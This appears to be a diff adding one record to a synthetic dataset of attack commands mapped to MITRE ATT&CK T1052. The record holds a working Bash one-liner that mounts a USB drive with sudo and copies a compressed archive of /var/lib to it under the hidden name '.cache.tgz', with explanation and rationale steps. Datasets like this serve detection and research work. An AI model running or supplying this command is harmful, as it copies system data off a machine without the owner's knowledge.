@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk \"$2==\\\"usb\\\"{print $1\\\"1\\\"}\" | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && tar -cf - /var/lib 2>/dev/null | gzip -9 > /mnt/usb/.cache.tgz && sync && umount /mnt/usb'",
+  "explanation": "Archives and gzip-compresses /var/lib and writes the result to a mounted USB partition, ensuring data leaves only via the physical device.",
+  "rationale_steps": [
+    "Identify and mount the attached USB partition.",
+    "Create a tar of local application data.",
+    "Compress using gzip to reduce footprint.",
+    "Save to the USB, flush buffers, and unmount.",
+    "No network endpoints are contacted."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-7a44f113",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
